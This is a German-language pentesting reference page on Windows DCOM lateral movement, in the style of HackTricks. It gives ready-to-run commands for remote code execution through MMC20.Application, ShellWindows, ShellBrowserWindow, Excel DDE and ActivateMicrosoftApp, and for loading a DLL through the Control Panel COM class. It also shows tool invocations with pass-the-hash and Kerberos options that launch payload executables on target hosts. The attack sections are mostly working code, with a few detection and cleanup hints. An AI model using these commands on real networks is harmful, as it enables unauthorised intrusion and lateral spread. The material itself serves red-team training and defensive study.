# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement ist attraktiv, weil vorhandene, über RPC/DCOM zugängliche COM-Server wiederverwendet werden, anstatt einen Dienst oder eine geplante Aufgabe zu erstellen. In der Praxis bedeutet dies, dass die erste Verbindung normalerweise über TCP/135 hergestellt wird und anschließend zu dynamisch zugewiesenen hohen RPC-Ports wechselt.

## Voraussetzungen & wichtige Hinweise

- Normalerweise benötigst du einen lokalen Administrator-Kontext auf dem Zielsystem, und der Remote-COM-Server muss den Remote-Start bzw. die Remote-Aktivierung zulassen.
- Seit dem **14. März 2023** setzt Microsoft die DCOM-Härtung für unterstützte Systeme durch. Alte Clients, die eine niedrige Authentifizierungsstufe für die Aktivierung anfordern, können fehlschlagen, sofern sie nicht mindestens `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` aushandeln. Moderne Windows-Clients werden normalerweise automatisch auf eine höhere Stufe gesetzt, daher funktionieren aktuelle Tools üblicherweise weiterhin.<sup>[[3]](#references)</sup>
- Manuelle oder per Script ausgeführte DCOM-Ausführung benötigt im Allgemeinen TCP/135 sowie den dynamischen RPC-Portbereich des Zielsystems. Wenn du Impackets `dcomexec.py` verwendest und die Kommandoausgabe zurückerhalten möchtest, benötigst du normalerweise zusätzlich SMB-Zugriff auf `ADMIN$` (oder eine andere beschreib- bzw. lesbare Freigabe).
- Wenn RPC/DCOM funktioniert, SMB jedoch blockiert ist, kann `dcomexec.py -nooutput` weiterhin für eine blinde Ausführung nützlich sein.

Schnelltests:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Weitere Informationen zu dieser Technik finden Sie im [ursprünglichen Beitrag zu MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Objekte des Distributed Component Object Model (DCOM) bieten interessante Möglichkeiten für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt umfassende Dokumentation sowohl für DCOM als auch für das Component Object Model (COM) bereit, die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) verfügbar ist. Eine Liste der DCOM-Anwendungen kann mit dem folgenden PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Das COM-Objekt [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) ermöglicht das Scripting von MMC-Snap-in-Operationen. Bemerkenswert ist, dass dieses Objekt unter `Document.ActiveView` eine `ExecuteShellCommand`-Methode enthält. Weitere Informationen zu dieser Methode finden sich [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Überprüfe dies durch Ausführung:<sup>[[6]](#references)</sup>

Diese Funktion ermöglicht die Ausführung von Befehlen über ein Netzwerk durch eine DCOM-Anwendung. Um remote als Administrator mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl stellt eine Verbindung zur DCOM-Anwendung her und gibt eine Instanz des COM-Objekts zurück. Anschließend kann die ExecuteShellCommand-Methode aufgerufen werden, um einen Prozess auf dem Remotehost auszuführen. Der Prozess umfasst die folgenden Schritte:

Methoden prüfen:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE erlangen:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Das letzte Argument ist der Fensterstil. `7` sorgt dafür, dass das Fenster minimiert bleibt. Aus operativer Sicht führt die Ausführung über MMC häufig dazu, dass ein entfernter `mmc.exe`-Prozess dein Payload startet, was sich von den nachfolgend beschriebenen Explorer-basierten Objekten unterscheidet.

## ShellWindows & ShellBrowserWindow

**Weitere Informationen zu dieser Technik findest du im ursprünglichen Beitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Beim Objekt **MMC20.Application** wurde festgestellt, dass es keine expliziten „LaunchPermissions“ besitzt und standardmäßig Berechtigungen verwendet, die Administratoren Zugriff gewähren. Weitere Details findest du [hier](https://twitter.com/tiraniddo/status/817532039771525120). Außerdem wird empfohlen, OleView .NET von [@tiraniddo](https://twitter.com/tiraniddo) zu verwenden, um Objekte ohne explizite Launch Permission zu filtern.

Zwei spezifische Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden aufgrund ihrer fehlenden expliziten Launch Permissions hervorgehoben. Das Fehlen eines `LaunchPermission`-Registry-Eintrags unter `HKCR:\AppID\{guid}` bedeutet, dass keine expliziten Berechtigungen vorhanden sind.

Im Vergleich zu `MMC20.Application` sind diese Objekte aus OPSEC-Sicht häufig unauffälliger, da der Befehl auf dem entfernten Host üblicherweise als Child-Prozess von `explorer.exe` statt von `mmc.exe` ausgeführt wird.

### ShellWindows

Bei `ShellWindows`, das keine ProgID besitzt, ermöglichen die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Instanziierung des Objekts anhand seiner AppID. Dieser Prozess verwendet OleView .NET, um die CLSID von `ShellWindows` abzurufen. Nach der Instanziierung ist eine Interaktion über die Methode `WindowsShell.Item` möglich, wodurch Methodenaufrufe wie `Document.Application.ShellExecute` ausgeführt werden können.

Es wurden folgende PowerShell-Beispiele bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` ist ähnlich, kann aber direkt über seine CLSID instanziiert werden, um zu `Document.Application.ShellExecute` zu wechseln:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement mit Excel-DCOM-Objekten

Lateral Movement kann durch das Ausnutzen von DCOM-Excel-Objekten erreicht werden. Für detaillierte Informationen empfiehlt es sich, die Diskussion über die Nutzung von Excel DDE für Lateral Movement via DCOM im [Blog von Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.<sup>[[5]](#references)</sup>

Das Empire-Projekt stellt ein PowerShell-Skript bereit, das die Verwendung von Excel für Remote Code Execution (RCE) durch die Manipulation von DCOM-Objekten demonstriert. Nachfolgend finden sich Ausschnitte aus dem Skript im [GitHub-Repository von Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), die verschiedene Methoden zeigen, Excel für RCE zu missbrauchen:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Neuere Forschung hat diesen Bereich um die Methode `ActivateMicrosoftApp()` von `Excel.Application` erweitert. Die zentrale Idee besteht darin, dass Excel versuchen kann, veraltete Microsoft-Anwendungen wie FoxPro, Schedule Plus oder Project zu starten, indem es den System-`PATH` durchsucht. Wenn ein Operator eine Payload mit einem dieser erwarteten Namen an einem beschreibbaren Ort ablegen kann, der Teil des `PATH` des Ziels ist, wird Excel sie ausführen.<sup>[[4]](#references)</sup>

Anforderungen für diese Variante:

- Lokaler Administrator auf dem Ziel
- Excel auf dem Ziel installiert
- Möglichkeit, eine Payload in ein beschreibbares Verzeichnis im `PATH` des Ziels zu schreiben

Praktisches Beispiel unter Ausnutzung der FoxPro-Suche (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Wenn auf dem angreifenden Host die lokale `Excel.Application`-ProgID nicht registriert ist, instanziieren Sie das Remote-Objekt stattdessen anhand der CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
In der Praxis missbrauchte Werte:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — Laden einer registrierten Control Panel DLL

Die Klasse `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) stellt `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) bereit. Ihre `Open()`-Methode bewirkt, dass unter dem Schlüssel `Control Panel\Cpls` registrierte Control Panel DLLs von einem entfernten `dllhost.exe` geladen werden. Die Klasse verfügt auf den getesteten Systemen über keine expliziten Start-/Zugriffsberechtigungen und übernimmt daher die standardmäßige DCOM-Richtlinie (für die remote Aktivierung normalerweise ein Administrator erforderlich ist). Ein beliebiger Elementname reicht aus, damit `Open()` die registrierten DLLs verarbeitet; die Payload benötigt keine `.cpl`-Erweiterung, muss jedoch eine gültige DLL der korrekten Architektur sein.<sup>[[7]](#references)</sup>

Dieses Primitive ist **stage-and-trigger**, keine reine Command-Ausführung: Kopiere zunächst eine DLL auf das Zielsystem und erstelle einen `REG_EXPAND_SZ`-Wert, der auf sie verweist, und aktiviere anschließend das Objekt über DCOM. Zum Beispiel aus einem administrativen Windows-Kontext:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Der öffentliche [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)-Client implementiert den undokumentierten DCOM-Aufruf mit Impacket. Die Angabe eines beliebigen Control-Panel-Elementnamens reicht aus; der Client kann einen RPC-Fehler melden, obwohl `dllhost.exe` die DLL geladen hat.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operativ benötigt dieser Pfad außerdem einen Datei-Schreibkanal und Zugriff auf die Remote-Registry und ist daher geräuschvoller als `MMC20`/`ShellWindows`. Er erzeugt einen Persistenz-Nebeneffekt, da das spätere Öffnen der Systemsteuerung denselben Eintrag erneut laden kann. Entferne den Wert nach der Ausführung und suche nach unerwarteten Werten unter `Control Panel\Cpls` zusammen mit ungewöhnlichen DLL-Ladevorgängen in `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Automatisierungstools für Lateral Movement

Zwei Tools werden für die Automatisierung dieser Techniken hervorgehoben:

- **Invoke-DCOM.ps1**: Ein vom Empire-Projekt bereitgestelltes PowerShell-Skript, das die Ausführung verschiedener Methoden zum Ausführen von Code auf Remote-Rechnern vereinfacht. Dieses Skript ist im Empire-GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool zur Remote-Ausführung von Code, das mit folgendem Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatische Tools

- Das PowerShell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) ermöglicht es, auf einfache Weise alle kommentierten Methoden zur Codeausführung auf anderen Rechnern aufzurufen.
- Mit Impackets `dcomexec.py` können Befehle auf entfernten Systemen mithilfe von DCOM ausgeführt werden. Aktuelle Builds unterstützen `ShellWindows`, `ShellBrowserWindow` und `MMC20` und verwenden standardmäßig `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Du könntest auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Du könntest auch [**SharpMove**](https://github.com/0xthirteen/SharpMove) verwenden
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Laterale Bewegung mit dem MMC20.Application COM-Objekt](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Laterale Bewegung über DCOM: Runde 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 – Änderungen für die Windows DCOM Server Security Feature Bypass-Sicherheitsfunktion verwalten (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Laterale Bewegung: Die Leistungsfähigkeit der DCOM Excel Application missbrauchen](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Excel DDE für laterale Bewegung über DCOM nutzen](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com – MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [DCOM-Objekte für die Remote-Befehlsausführung verwenden](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
